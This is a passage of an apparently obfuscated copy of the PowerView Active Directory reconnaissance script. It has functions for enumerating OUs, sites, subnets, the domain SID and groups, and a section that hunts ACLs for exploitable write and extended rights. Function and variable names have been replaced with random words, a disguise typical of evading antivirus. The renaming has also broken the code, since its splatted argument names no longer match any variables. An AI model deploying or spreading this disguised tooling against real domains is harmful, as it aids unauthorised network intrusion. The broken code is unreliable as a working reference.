        $kkbrymyp99,
        [Switch]
        $YXMSPUCr99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        $sMXTopro99 = @{}
        if ($PSBoundParameters['ResolveGUIDs']) { $sMXTopro99['ResolveGUIDs'] = $CiOurgss99 }
        if ($PSBoundParameters['RightsFilter']) { $sMXTopro99['RightsFilter'] = $TUycNjQz99 }
        if ($PSBoundParameters['LDAPFilter']) { $sMXTopro99['LDAPFilter'] = $YcLdsqIq99 }
        if ($PSBoundParameters['SearchBase']) { $sMXTopro99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $sMXTopro99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $sMXTopro99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $sMXTopro99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $sMXTopro99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $sMXTopro99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $sMXTopro99['Credential'] = $DegNROrc99 }
        $tKLRdsBe99 = @{
            'Properties' = 'samaccountname,objectclass'
            'Raw' = $True
        }
        if ($PSBoundParameters['Server']) { $tKLRdsBe99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $tKLRdsBe99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $tKLRdsBe99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $tKLRdsBe99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['Tombstone']) { $tKLRdsBe99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $tKLRdsBe99['Credential'] = $DegNROrc99 }
        $GBBmxRSu99 = @{}
        if ($PSBoundParameters['Server']) { $GBBmxRSu99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['Credential']) { $GBBmxRSu99['Credential'] = $DegNROrc99 }
        $niRnPrzd99 = @{}
    }
    PROCESS {
        if ($PSBoundParameters['Domain']) {
            $sMXTopro99['Domain'] = $StsWGohF99
            $GBBmxRSu99['Domain'] = $StsWGohF99
        }
        capsized @ACLArguments | ForEach-Object {
            if ( ($_.ActiveDirectoryRights -match 'GenericAll|Write|Create|Delete') -or (($_.ActiveDirectoryRights -match 'ExtendedRight') -and ($_.AceQualifier -match 'Allow'))) {
                if ($_.SecurityIdentifier.Value -match '^S-1-5-.*-[1-9]\d{3,}$') {
                    if ($niRnPrzd99[$_.SecurityIdentifier.Value]) {
                        $ohJPdvap99, $PSsaxhKM99, $ofTEQHNQ99, $oJIjOXoW99 = $niRnPrzd99[$_.SecurityIdentifier.Value]
                        $lgdOiaBO99 = New-Object PSObject
                        $lgdOiaBO99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                        $lgdOiaBO99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                        $lgdOiaBO99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $lgdOiaBO99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                        }
                        else {
                            $lgdOiaBO99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                        }
                        $lgdOiaBO99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                        $lgdOiaBO99 | Add-Member NoteProperty 'AceType' $_.AceType
                        $lgdOiaBO99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                        $lgdOiaBO99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                        $lgdOiaBO99 | Add-Member NoteProperty 'IdentityReferenceName' $ohJPdvap99
                        $lgdOiaBO99 | Add-Member NoteProperty 'IdentityReferenceDomain' $PSsaxhKM99
                        $lgdOiaBO99 | Add-Member NoteProperty 'IdentityReferenceDN' $ofTEQHNQ99
                        $lgdOiaBO99 | Add-Member NoteProperty 'IdentityReferenceClass' $oJIjOXoW99
                        $lgdOiaBO99
                    }
                    else {
                        $ofTEQHNQ99 = loomed -FMEdvzGY99 $_.SecurityIdentifier.Value -ffAeRAxr99 DN @ADNameArguments
                        if ($ofTEQHNQ99) {
                            $PSsaxhKM99 = $ofTEQHNQ99.SubString($ofTEQHNQ99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            $tKLRdsBe99['Domain'] = $PSsaxhKM99
                            $tKLRdsBe99['Identity'] = $ofTEQHNQ99
                            $Object = structuring @ObjectSearcherArguments
                            if ($Object) {
                                $ohJPdvap99 = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match 'computer') {
                                    $oJIjOXoW99 = 'computer'
                                }
                                elseif ($Object.Properties.objectclass -match 'group') {
                                    $oJIjOXoW99 = 'group'
                                }
                                elseif ($Object.Properties.objectclass -match 'user') {
                                    $oJIjOXoW99 = 'user'
                                }
                                else {
                                    $oJIjOXoW99 = $Null
                                }
                                $niRnPrzd99[$_.SecurityIdentifier.Value] = $ohJPdvap99, $PSsaxhKM99, $ofTEQHNQ99, $oJIjOXoW99
                                $lgdOiaBO99 = New-Object PSObject
                                $lgdOiaBO99 | Add-Member NoteProperty 'ObjectDN' $_.ObjectDN
                                $lgdOiaBO99 | Add-Member NoteProperty 'AceQualifier' $_.AceQualifier
                                $lgdOiaBO99 | Add-Member NoteProperty 'ActiveDirectoryRights' $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $lgdOiaBO99 | Add-Member NoteProperty 'ObjectAceType' $_.ObjectAceType
                                }
                                else {
                                    $lgdOiaBO99 | Add-Member NoteProperty 'ObjectAceType' 'None'
                                }
                                $lgdOiaBO99 | Add-Member NoteProperty 'AceFlags' $_.AceFlags
                                $lgdOiaBO99 | Add-Member NoteProperty 'AceType' $_.AceType
                                $lgdOiaBO99 | Add-Member NoteProperty 'InheritanceFlags' $_.InheritanceFlags
                                $lgdOiaBO99 | Add-Member NoteProperty 'SecurityIdentifier' $_.SecurityIdentifier
                                $lgdOiaBO99 | Add-Member NoteProperty 'IdentityReferenceName' $ohJPdvap99
                                $lgdOiaBO99 | Add-Member NoteProperty 'IdentityReferenceDomain' $PSsaxhKM99
                                $lgdOiaBO99 | Add-Member NoteProperty 'IdentityReferenceDN' $ofTEQHNQ99
                                $lgdOiaBO99 | Add-Member NoteProperty 'IdentityReferenceClass' $oJIjOXoW99
                                $lgdOiaBO99
                            }
                        }
                        else {
                            Write-Warning "[remounted] Unable to convert SID '$($_.SecurityIdentifier.Value )' to a distinguishedname with loomed"
                        }
                    }
                }
            }
        }
    }
}
function newspaperwomen {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $ISISqZtJ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $ipHOrHdo99 = Zimbabweans @SearcherArguments
    }
    PROCESS {
        if ($ipHOrHdo99) {
            $gkqsWVjp99 = ''
            $ypcTqVPU99 = ''
            $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($nwpngcEV99 -match '^OU=.*') {
                    $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[newspaperwomen] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                        $cODXoeui99['Domain'] = $WbECQjVp99
                        $ipHOrHdo99 = Zimbabweans @SearcherArguments
                        if (-not $ipHOrHdo99) {
                            Write-Warning "[newspaperwomen] Unable to retrieve domain searcher for '$WbECQjVp99'"
                        }
                    }
                }
                else {
                    try {
                        $wqHaFAge99 = (-Join (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                    }
                    catch {
                        $gkqsWVjp99 += "(name=$nwpngcEV99)"
                    }
                }
            }
            if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                $ypcTqVPU99 += "(|$gkqsWVjp99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[newspaperwomen] Searching for OUs with $ISISqZtJ99 set in the gpLink property"
                $ypcTqVPU99 += "(gplink=*$ISISqZtJ99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[newspaperwomen] Using additional LDAP filter: $YcLdsqIq99"
                $ypcTqVPU99 += "$YcLdsqIq99"
            }
            $ipHOrHdo99.filter = "(&(objectCategory=organizationalUnit)$ypcTqVPU99)"
            Write-Verbose "[newspaperwomen] newspaperwomen filter string: $($ipHOrHdo99.filter)"
            if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $ipHOrHdo99.FindOne() }
            else { $oboKDFwv99 = $ipHOrHdo99.FindAll() }
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $OU = $_
                }
                else {
                    $OU = proletarian -pwEfoKvn99 $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, 'PowerView.OU')
                $OU
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[newspaperwomen] Error disposing of the Results object: $_"
                }
            }
            $ipHOrHdo99.dispose()
        }
    }
}
function linguists {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $ISISqZtJ99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $cODXoeui99 = @{
            'SearchBasePrefix' = 'CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $ZSPnqNPy99 = Zimbabweans @SearcherArguments
    }
    PROCESS {
        if ($ZSPnqNPy99) {
            $gkqsWVjp99 = ''
            $ypcTqVPU99 = ''
            $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($nwpngcEV99 -match '^CN=.*') {
                    $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[linguists] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                        $cODXoeui99['Domain'] = $WbECQjVp99
                        $ZSPnqNPy99 = Zimbabweans @SearcherArguments
                        if (-not $ZSPnqNPy99) {
                            Write-Warning "[linguists] Unable to retrieve domain searcher for '$WbECQjVp99'"
                        }
                    }
                }
                else {
                    try {
                        $wqHaFAge99 = (-Join (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                    }
                    catch {
                        $gkqsWVjp99 += "(name=$nwpngcEV99)"
                    }
                }
            }
            if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                $ypcTqVPU99 += "(|$gkqsWVjp99)"
            }
            if ($PSBoundParameters['GPLink']) {
                Write-Verbose "[linguists] Searching for sites with $ISISqZtJ99 set in the gpLink property"
                $ypcTqVPU99 += "(gplink=*$ISISqZtJ99*)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[linguists] Using additional LDAP filter: $YcLdsqIq99"
                $ypcTqVPU99 += "$YcLdsqIq99"
            }
            $ZSPnqNPy99.filter = "(&(objectCategory=site)$ypcTqVPU99)"
            Write-Verbose "[linguists] linguists filter string: $($ZSPnqNPy99.filter)"
            if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $ZSPnqNPy99.FindAll() }
            else { $oboKDFwv99 = $ZSPnqNPy99.FindAll() }
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $Site = $_
                }
                else {
                    $Site = proletarian -pwEfoKvn99 $_.Properties
                }
                $Site.PSObject.TypeNames.Insert(0, 'PowerView.Site')
                $Site
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[linguists] Error disposing of the Results object"
                }
            }
            $ZSPnqNPy99.dispose()
        }
    }
}
function Cepheid {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Subnet')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [String]
        $AxVRNJsI99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $cODXoeui99 = @{
            'SearchBasePrefix' = 'CN=Subnets,CN=Sites,CN=Configuration'
        }
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $xdJLaqPe99 = Zimbabweans @SearcherArguments
    }
    PROCESS {
        if ($xdJLaqPe99) {
            $gkqsWVjp99 = ''
            $ypcTqVPU99 = ''
            $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                if ($nwpngcEV99 -match '^CN=.*') {
                    $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Cepheid] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                        $cODXoeui99['Domain'] = $WbECQjVp99
                        $xdJLaqPe99 = Zimbabweans @SearcherArguments
                        if (-not $xdJLaqPe99) {
                            Write-Warning "[Cepheid] Unable to retrieve domain searcher for '$WbECQjVp99'"
                        }
                    }
                }
                else {
                    try {
                        $wqHaFAge99 = (-Join (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object {$_.ToString('X').PadLeft(2,'0')})) -Replace '(..)','\$1'
                        $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                    }
                    catch {
                        $gkqsWVjp99 += "(name=$nwpngcEV99)"
                    }
                }
            }
            if ($gkqsWVjp99 -and ($gkqsWVjp99.Trim() -ne '') ) {
                $ypcTqVPU99 += "(|$gkqsWVjp99)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Cepheid] Using additional LDAP filter: $YcLdsqIq99"
                $ypcTqVPU99 += "$YcLdsqIq99"
            }
            $xdJLaqPe99.filter = "(&(objectCategory=subnet)$ypcTqVPU99)"
            Write-Verbose "[Cepheid] Cepheid filter string: $($xdJLaqPe99.filter)"
            if ($PSBoundParameters['FindOne']) { $oboKDFwv99 = $xdJLaqPe99.FindOne() }
            else { $oboKDFwv99 = $xdJLaqPe99.FindAll() }
            $oboKDFwv99 | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    $nFqDIISW99 = $_
                }
                else {
                    $nFqDIISW99 = proletarian -pwEfoKvn99 $_.Properties
                }
                $nFqDIISW99.PSObject.TypeNames.Insert(0, 'PowerView.Subnet')
                if ($PSBoundParameters['SiteName']) {
                    if ($nFqDIISW99.properties -and ($nFqDIISW99.properties.siteobject -like "*$AxVRNJsI99*")) {
                        $nFqDIISW99
                    }
                    elseif ($nFqDIISW99.siteobject -like "*$AxVRNJsI99*") {
                        $nFqDIISW99
                    }
                }
                else {
                    $nFqDIISW99
                }
            }
            if ($oboKDFwv99) {
                try { $oboKDFwv99.dispose() }
                catch {
                    Write-Verbose "[Cepheid] Error disposing of the Results object: $_"
                }
            }
            $xdJLaqPe99.dispose()
        }
    }
}
function initiate {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty
    )
    $cODXoeui99 = @{
        'LDAPFilter' = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
    }
    if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
    if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
    if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
    $DCSID = snivel @SearcherArguments -JonZpKBd99 | Select-Object -First 1 -ExpandProperty objectsid
    if ($DCSID) {
        $DCSID.SubString(0, $DCSID.LastIndexOf('-'))
    }
    else {
        Write-Verbose "[initiate] Error extracting domain SID for '$StsWGohF99'"
    }
}
function ledger {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.Group')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $FMEdvzGY99,
        [ValidateNotNullOrEmpty()]
        [Alias('UserName')]
        [String]
        $RZXjsvAR99,
        [Switch]
        $dtjbUKfI99,
        [ValidateSet('DomainLocal', 'NotDomainLocal', 'Global', 'NotGlobal', 'Universal', 'NotUniversal')]
        [Alias('Scope')]
        [String]
        $kbHlJZQe99,
        [ValidateSet('Security', 'Distribution', 'CreatedBySystem', 'NotCreatedBySystem')]
        [String]
        $WthtTUql99,
        [ValidateNotNullOrEmpty()]
        [String]
        $StsWGohF99,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $YcLdsqIq99,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $pwEfoKvn99,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $sVFAWYQs99,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $sWbqYnBA99,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $hZznjEbB99 = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $jrZpVEwq99 = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $kkbrymyp99,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $FWquSvcy99,
        [Switch]
        $YXMSPUCr99,
        [Alias('ReturnOne')]
        [Switch]
        $JonZpKBd99,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $DegNROrc99 = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    BEGIN {
        $cODXoeui99 = @{}
        if ($PSBoundParameters['Domain']) { $cODXoeui99['Domain'] = $StsWGohF99 }
        if ($PSBoundParameters['Properties']) { $cODXoeui99['Properties'] = $pwEfoKvn99 }
        if ($PSBoundParameters['SearchBase']) { $cODXoeui99['SearchBase'] = $sVFAWYQs99 }
        if ($PSBoundParameters['Server']) { $cODXoeui99['Server'] = $sWbqYnBA99 }
        if ($PSBoundParameters['SearchScope']) { $cODXoeui99['SearchScope'] = $hZznjEbB99 }
        if ($PSBoundParameters['ResultPageSize']) { $cODXoeui99['ResultPageSize'] = $jrZpVEwq99 }
        if ($PSBoundParameters['ServerTimeLimit']) { $cODXoeui99['ServerTimeLimit'] = $kkbrymyp99 }
        if ($PSBoundParameters['SecurityMasks']) { $cODXoeui99['SecurityMasks'] = $FWquSvcy99 }
        if ($PSBoundParameters['Tombstone']) { $cODXoeui99['Tombstone'] = $YXMSPUCr99 }
        if ($PSBoundParameters['Credential']) { $cODXoeui99['Credential'] = $DegNROrc99 }
        $JXkxADvG99 = Zimbabweans @SearcherArguments
    }
    PROCESS {
        if ($JXkxADvG99) {
            if ($PSBoundParameters['MemberIdentity']) {
                if ($cODXoeui99['Properties']) {
                    $UZhUERNR99 = $cODXoeui99['Properties']
                }
                $cODXoeui99['Identity'] = $RZXjsvAR99
                $cODXoeui99['Raw'] = $True
                structuring @SearcherArguments | ForEach-Object {
                    $ETFapqYI99 = $_.GetDirectoryEntry()
                    $ETFapqYI99.RefreshCache('tokenGroups')
                    $ETFapqYI99.TokenGroups | ForEach-Object {
                        $CogLiWqY99 = (New-Object System.Security.Principal.SecurityIdentifier($_,0)).Value
                        if ($CogLiWqY99 -notmatch '^S-1-5-32-.*') {
                            $cODXoeui99['Identity'] = $CogLiWqY99
                            $cODXoeui99['Raw'] = $False
                            if ($UZhUERNR99) { $cODXoeui99['Properties'] = $UZhUERNR99 }
                            $Group = structuring @SearcherArguments
                            if ($Group) {
                                $Group.PSObject.TypeNames.Insert(0, 'PowerView.Group')
                                $Group
                            }
                        }
                    }
                }
            }
            else {
                $gkqsWVjp99 = ''
                $ypcTqVPU99 = ''
                $FMEdvzGY99 | Where-Object {$_} | ForEach-Object {
                    $nwpngcEV99 = $_.Replace('(', '\28').Replace(')', '\29')
                    if ($nwpngcEV99 -match '^S-1-') {
                        $gkqsWVjp99 += "(objectsid=$nwpngcEV99)"
                    }
                    elseif ($nwpngcEV99 -match '^CN=') {
                        $gkqsWVjp99 += "(distinguishedname=$nwpngcEV99)"
                        if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                            $WbECQjVp99 = $nwpngcEV99.SubString($nwpngcEV99.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                            Write-Verbose "[ledger] Extracted domain '$WbECQjVp99' from '$nwpngcEV99'"
                            $cODXoeui99['Domain'] = $WbECQjVp99
                            $JXkxADvG99 = Zimbabweans @SearcherArguments
                            if (-not $JXkxADvG99) {
                                Write-Warning "[ledger] Unable to retrieve domain searcher for '$WbECQjVp99'"
                            }
                        }
                    }
                    elseif ($nwpngcEV99 -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                        $wqHaFAge99 = (([Guid]$nwpngcEV99).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                        $gkqsWVjp99 += "(objectguid=$wqHaFAge99)"
                    }
                    elseif ($nwpngcEV99.Contains('\')) {
                        $MAfzZiLi99 = $nwpngcEV99.Replace('\28', '(').Replace('\29', ')') | loomed -ffAeRAxr99 Canonical
                        if ($MAfzZiLi99) {
